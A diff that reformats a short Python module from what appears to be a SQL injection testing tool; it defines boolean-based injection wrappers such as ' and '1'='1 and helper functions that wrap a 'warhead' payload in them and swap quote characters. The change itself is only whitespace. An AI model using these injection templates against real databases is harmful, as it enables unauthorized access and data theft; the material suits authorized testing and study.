@@ -1,16 +1,22 @@
 #-------------------------------------------------------------------------------
-base_templates =    [['\'and ',' and\'1\'=\'1','\''],                           #1
-                    ['"and ',' and"1"="1','"'],                                 #2
-                    [' and ',' and 1=1','\''],                                   #3
-                    ['[ ',' ]','\'']]                                            #4
+base_templates = [['\'and ', ' and\'1\'=\'1', '\''],  # 1
+                  ['"and ', ' and"1"="1', '"'],  # 2
+                  [' and ', ' and 1=1', '\''],  # 3
+                  ['[ ', ' ]', '\'']]  # 4
 #-------------------------------------------------------------------------------
-def template(_i,_warhead):                                                      #templates
-    return _i[0]+_warhead+_i[1]
+
+
+def template(_i, _warhead):  # templates
+    return _i[0] + _warhead + _i[1]
 #-------------------------------------------------------------------------------
-def choose_tag(_i,_warhead):                                                    #choose_tag
+
+
+def choose_tag(_i, _warhead):  # choose_tag
     return _warhead.replace('{tag}', _i[2])
 #-------------------------------------------------------------------------------
-def choose_tag1(_i,_warhead):                                                    #choose_tag
+
+
+def choose_tag1(_i, _warhead):  # choose_tag
     if _i[2] == '"':
         return _warhead.replace('{tag1}', "'")
     return _warhead.replace('{tag1}', '"')
